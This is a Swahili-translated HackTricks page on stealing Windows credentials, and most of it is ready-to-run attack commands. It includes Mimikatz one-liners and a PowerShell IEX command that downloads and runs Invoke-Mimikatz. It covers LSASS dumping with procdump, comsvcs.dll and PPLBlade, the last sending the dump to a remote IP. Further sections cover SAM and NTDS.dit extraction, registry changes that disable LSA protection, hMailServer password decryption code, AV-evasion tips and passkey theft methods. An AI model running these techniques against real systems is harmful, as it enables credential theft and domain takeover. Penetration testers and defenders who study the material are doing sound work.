# Kuiba Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials za Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya ulinzi unaowezekana wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials with Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda ili **kutafuta passwords na hashes** ndani ya victim.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **ni Microsoft tool halali**, haitambuliwi na Defender.\
Unaweza kutumia tool hii **kudump lsass process**, **kupakua dump** na **kuextract** **credentials locally** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe ku-dump lsass.exe** kuwa ni **hasidi**, kwa sababu **zinatambua** mfuatano wa herufi **"procdump.exe" na "lsass.exe"**. Kwa hiyo, ni **stealthier** zaidi kupitisha **PID** ya lsass.exe kama **argument** kwa procdump **badala ya** **jina lsass.exe.**

### Ku-dump lsass kwa kutumia **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana katika `C:\Windows\System32`, inawajibika kwa **ku-dump process memory** wakati wa crash. DLL hii inajumuisha **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Si muhimu kutumia arguments mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Process ID ya ku-dump ndiyo kipengele cha kwanza, eneo la dump file linawakilisha cha pili, na kipengele cha tatu ni neno **full** pekee. Hakuna options mbadala.\
Baada ya kuchanganua vipengele hivi vitatu, DLL huanza kuunda dump file na kuhamisha memory ya process iliyobainishwa kwenda kwenye file hili.\
Kutumia **comsvcs.dll** kunawezekana kwa ku-dump process ya lsass, hivyo kuondoa hitaji la ku-upload na ku-execute procdump. Mbinu hii imeelezwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Command ifuatayo hutumiwa kwa ajili ya execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza ku-automate mchakato huu kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kudump lsass kwa Task Manager**

1. Bofya kulia kwenye Task Bar na ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato wa "Local Security Authority Process" na ubofye "Create dump file".

### Kudump lsass kwa procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyotiwa sahihi na Microsoft ambayo ni sehemu ya suite ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Kudump lsass kwa PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono kuficha memory dump na kuihamisha kwenye workstations za mbali bila kuihifadhi kwenye disk.

**Utendaji muhimu**:

1. Kupita ulinzi wa PPL
2. Kuficha files za memory dump ili kukwepa mbinu za Defender za kugundua zinazotegemea signatures
3. Kupakia memory dump kwa kutumia mbinu za RAW na SMB bila kuihifadhi kwenye disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – LSASS dumping ya SSP bila MiniDumpWriteDump

Ink Dragon husafirisha dumper ya hatua tatu inayoitwa **LalsDumper**, ambayo haiiti kamwe `MiniDumpWriteDump`, hivyo EDR hooks kwenye API hiyo hazitawahi ku-trigger:

1. **Stage 1 loader (`lals.exe`)** – hutafuta `fdp.dll` kwa placeholder yenye herufi 32 za `d` ndogo, hui-overwrite kwa absolute path ya `rtu.txt`, huhifadhi DLL iliyopatchiwa kama `nfdp.dll`, kisha huita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Stage 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hu-XOR kila byte kwa `0x20`, kisha hu-map blob iliyodekodishwa kwenye memory kabla ya kuhamisha execution.
3. **Stage 3 dumper** – payload iliyomapishwa hu-implement tena logic ya MiniDump kwa kutumia **direct syscalls** zinazoresolved kutoka kwa majina ya API yaliyohashwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, hu-stream dump iliyocompressiwa ya LSASS kwenye file, kisha hufunga handle ili exfiltration ifanyike baadaye.

Maelezo ya operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory moja. Stage 1 huandika upya placeholder iliyohard-code kwa absolute path ya `rtu.txt`, kwa hivyo kuzigawanya huvunja chain.
* Registration hufanyika kwa ku-append `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza ku-seed value hiyo mwenyewe ili kuifanya LSASS ipakie upya SSP kila boot.
* Files za `%TEMP%\*.ddt` ni dumps zilizocompressiwa. Zidecompress locally, kisha uzitumie kwa Mimikatz/Volatility kwa credential extraction.
* Ku-run `lals.exe` kunahitaji admin/SeTcb rights ili `AddSecurityPackageA` ifanikiwe; call ikirudisha majibu, LSASS hupakia rogue SSP kwa uwazi na ku-execute Stage 2.
* Kuondoa DLL kutoka disk hakuiondoi kwenye LSASS. Futa registry entry na u-restart LSASS (reboot), au iache kwa persistence ya muda mrefu.

## CrackMapExec

### Dump hashes za SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit kutoka target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump historia ya password ya NTDS.dit kutoka kwenye target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha attribute ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kuiba SAM & SYSTEM

Faili hizi zinapaswa **kuwa katika** _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zimelindwa.

### Kutoka Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwa Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** kwa kutumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kutumia service hii kunakili files zilizolindwa. Unahitaji kuwa Administrator.

#### Using vssadmin

Binary ya vssadmin inapatikana tu katika matoleo ya Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya hivyo hivyo kutoka **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili ya SAM** (kiendeshi kinachotumika ni "C:" na faili imehifadhiwa kwenye C:\users\Public), lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Mwisho, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kutengeneza nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credentials za Active Directory - NTDS.dit**

Faili ya **NTDS.dit** inajulikana kama moyo wa **Active Directory**, ikiwa na data muhimu kuhusu objects za users, groups, na memberships zao. Hapa ndipo **password hashes** za users wa domain zinahifadhiwa. Faili hii ni database ya **Extensible Storage Engine (ESE)** na iko kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Ndani ya database hii, tables kuu tatu zinatunzwa:

- **Data Table**: Table hii ina jukumu la kuhifadhi maelezo kuhusu objects kama users na groups.
- **Link Table**: Hufuatilia mahusiano, kama vile group memberships.
- **SD Table**: **Security descriptors** za kila object huhifadhiwa hapa, kuhakikisha usalama na access control ya objects zilizohifadhiwa.

Maelezo zaidi kuhusu hili: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows hutumia _Ntdsa.dll_ kuingiliana na faili hiyo, na inatumiwa na _lsass.exe_. Kwa hiyo, **sehemu** ya faili ya **NTDS.dit** inaweza kuwa **ndani ya** memory ya `lsass` (unaweza kupata data iliyofikiwa hivi karibuni, huenda kwa sababu ya kuboreshwa kwa performance kwa kutumia **cache**).

#### Kudecrypt hashes zilizo ndani ya NTDS.dit

Hash imefichwa kwa cyphering mara 3:

1. Decrypt Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Decrypt **hash** kwa kutumia **PEK** na **RC4**.
3. Decrypt **hash** kwa kutumia **DES**.

**PEK** ina value **ileile** katika kila domain controller, lakini imefichwa kwa **cyphering** ndani ya faili ya **NTDS.dit** kwa kutumia **BOOTKEY** ya **SYSTEM file ya domain controller (inatofautiana kati ya domain controllers)**. Hii ndiyo sababu ili kupata credentials kutoka kwenye faili ya NTDS.dit **unahitaji files za NTDS.dit na SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia ujanja wa [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, tumia ujanja wa [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili za **NTDS.dit** na **SYSTEM**, unaweza kutumia tools kama _secretsdump.py_ **kutoa hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuzitoa kiotomatiki** ukitumia mtumiaji halali wa domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **NTDS.dit files kubwa**, inapendekezwa ku-extract kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Ku-extract domain objects kutoka NTDS.dit hadi kwenye SQLite database**

NTDS objects zinaweza ku-extractiwa hadi kwenye SQLite database kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Si secrets pekee zinazotolewa, bali pia objects nzima pamoja na attributes zake kwa ajili ya kupata taarifa zaidi wakati raw NTDS.dit file tayari imepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive ni ya hiari lakini huwezesha decryption ya secrets (NT & LM hashes, supplemental credentials kama vile cleartext passwords, kerberos au trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data ifuatayo hutolewa: user na machine accounts pamoja na hashes zao, UAC flags, timestamp ya last logon na password change, maelezo ya accounts, majina, UPN, SPN, groups na recursive memberships, organizational units tree na membership, trusted domains pamoja na trusts type, direction na attributes...

## Lazagne

Download binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwenye software kadhaa.
```
lazagne.exe all
```
## Zana nyingine za extracting credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika ku-extract credentials kutoka kwenye memory. I-download kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extract credentials kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Toa credentials kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na **execute** tu, kisha passwords zitatolewa.

## Kuchimba idle RDP sessions na kudhoofisha security controls

Ink Dragon’s FinalDraft RAT ina tasker ya `DumpRDPHistory` ambayo techniques zake ni muhimu kwa red-teamer yeyote:

### Mkusanyiko wa telemetry wa mtindo wa DumpRDPHistory

* **Outbound RDP targets** – parse kila user hive katika `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la server, `UsernameHint`, na timestamp ya mwisho wa kuandikwa. Unaweza kuiga logic ya FinalDraft kwa PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query log ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event IDs **21** (successful logon) na **25** (disconnect) ili kubaini ni nani aliyekuwa aki-administer box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Ukishajua ni Domain Admin yupi huunganisha mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati session yake **iliyokatishwa** bado ipo. CredSSP + NTLM fallback huacha verifier na tokens zake katika LSASS, ambazo zinaweza kisha kureplayiwa kupitia SMB/WinRM ili kuchukua `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Registry downgrades zinazolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha keys kadhaa za Registry ili kurahisisha credential theft:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Kuweka `DisableRestrictedAdmin=1` kunalazimisha matumizi kamili tena ya credential/ticket wakati wa RDP, na kuwezesha pivots za mtindo wa pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa UAC token ili local admins wapate tokens zisizo na vikwazo kupitia network.
* `DSRMAdminLogonBehavior=2` humruhusu msimamizi wa DSRM ku-log on DC ikiwa online, na kuwapa attackers account nyingine ya built-in yenye high privilege.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya memory access kuwa rahisi kwa dumpers kama LalsDumper.

## hMailServer database credentials (post-compromise)

hMailServer huhifadhi DB password yake katika `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` chini ya `[Database] Password=`. Thamani hiyo imesimbwa kwa Blowfish kwa kutumia static key `THIS_KEY_IS_NOT_SECRET` na 4-byte word endianness swaps. Tumia hex string kutoka kwenye INI pamoja na Python snippet hii:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Kwa kutumia clear-text password, nakili SQL CE database ili kuepuka file locks, pakia 32-bit provider, na ufanye upgrade ikihitajika kabla ya ku-query hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Safu ya `accountpassword` hutumia hMaisha ya hMailServer (hashcat mode `1421`). Kuvunja thamani hizi kunaweza kutoa credentials zinazoweza kutumika tena kwa WinRM/SSH pivots.
## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya tooling hukamata **plaintext logon passwords** kwa kuingilia LSA logon callback `LsaApLogonUserEx2`. Wazo ni ku-hook au ku-wrap authentication package callback ili credentials zikamatwe **wakati wa logon** (kabla ya hashing), kisha ziandikwe kwenye disk au zirudishwe kwa operator. Hili kwa kawaida hutekelezwa kama helper anayejidunga kwenye LSA au kujisajili nayo, kisha kurekodi kila tukio la interactive/network logon lililofanikiwa pamoja na username, domain na password.

Operational notes:
- Inahitaji local admin/SYSTEM ili kupakia helper kwenye authentication path.
- Captured credentials huonekana tu logon inapotokea (interactive, RDP, service, au network logon kulingana na hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi taarifa za saved connection kwenye faili ya `sqlstudio.bin` ya kila user. Dedicated dumpers zinaweza kuchanganua faili hilo na kurejesha saved SQL credentials. Kwenye shells zinazorejesha command output pekee, faili hilo mara nyingi hu-exfiltrate kwa kulisimba kama Base64 na kulichapisha kwenye stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Kwa upande wa operator, jenga upya file na endesha dumper locally ili kurejesha credentials:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Wizi wa credentials za Passkeys / WebAuthn kutoka Chrome kwenye Windows

Ikiwa code execution inapatikana kama **victim user** kwenye Windows host inayotumia **Chrome + Google Password Manager synced passkeys**, passkeys huwa target ya kuvutia ya post-exploitation hata **bila admin/SYSTEM**.

### Local artifacts za kuvutia
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizoencodewa kwa protobuf. Process ya mtumiaji huyo huyo inaweza kuorodhesha **RP ID**, **username**, **credential ID**, na material ya private key iliyosimbwa kwa encryption ya synced passkeys.
- **`passkey_enclave_state`** huhifadhi hali ya local device-enrollment kama vile **`wrapped_identity_private_key`** na secret iliyofungwa kwa ajili ya kurejesha synced credentials.

Tathmini ya haraka:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs bado zinaweza kutumiwa vibaya kama local signing oracle

Ikiwa browser inatoa identity key inayoungwa mkono na TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blob hiyo katika hali inayoweza kufikiwa na mtumiaji, malware **haihitaji** kutoa raw private key. Inaweza tu ku-import blob hiyo tena kwenye **same machine** na kuomba TPM ya ndani isaini data inayodhibitiwa na attacker:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Hii inamaanisha **hardware binding huzuia export ya off-device lakini si matumizi ya mtumiaji huyo huyo kwenye endpoint iliyoathirika**.

### Njia za vitendo za abuse

1. **Pass-ta-key / device-identity relay**
- Enumerate `WebauthnCredentialSpecifics` kutoka Chrome's LevelDB.
- Anzisha passkey login na upate WebAuthn challenge mpya.
- Tumia blob ya `wrapped_identity_private_key` iliyoibiwa kwenye TPM ya mwathiriwa ili kusaini binding ya cloud-authenticator request.
- Relay assertion iliyorejeshwa kwa relying party.
- Hii ni muhimu hasa wakati RP inakubali `userVerification=preferred` au inashindwa kukataa assertions zenye **`UV=0`**.
2. **Pending UV-key hijack**
- Lazimisha re-onboarding kwa kufuta `passkey_enclave_state` au kwa kutuma operation halali iliyosainiwa ya `device/forget`.
- Ikiwa onboarding itaacha device katika **`uv_key_pending`**, sajili UV public key inayodhibitiwa na mshambulizi.
- Ikiwa provider hathibitishi attestation / secure-hardware origin ya UV key mpya, signatures zinazofuata kutoka kwenye attacker key zitachukuliwa kuwa **`UV=1`**.
3. **Master-secret / SDS recovery theft**
- Lazimisha recovery au rejoin ili Chrome ichukue synced-passkey master secret.
- Fuatilia kuundwa upya/kubadilishwa kwa `passkey_enclave_state`, kisha dump Chrome memory wakati plaintext ya **security domain secret (SDS)** iko resident.
- Tumia SDS iliyopatikana kusimbua fields zilizosimbwa katika kila record ya `WebauthnCredentialSpecifics` na kurejesha portable WebAuthn private keys.

### Mawazo ya DFIR / detection

- Fuatilia **ufutaji/kuundwa upya** kwa `passkey_enclave_state`.
- Toa alert kuhusu access isiyo ya kawaida ya Chrome **`Sync Data\LevelDB`** na processes zisizo za browser.
- Toa alert kuhusu **Chrome memory dumps** au cross-process memory access inayotia shaka.
- Chunguza maombi yanayojirudia ya **Google Password Manager recovery PIN** au re-onboarding isiyotarajiwa.
- Kumbuka kuwa WebAuthn **`signCount`** mara nyingi si muhimu kwa synced passkeys kwa sababu inaweza kubaki constant, hivyo classic clone detection huwa dhaifu.

## Marejeleo

- [Unit 42 – Uchunguzi Kuhusu Miaka ya Operesheni Zisizogunduliwa Zilizolenga Sekta Zenye Thamani Kubwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing kupitia SMTP → usimbuaji wa hMailServer credential → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Ndani ya Ink Dragon: Kufichua Relay Network na Utendaji wa Ndani wa Offensive Operation ya Kificho](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: Attack Surface Mpya katika Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
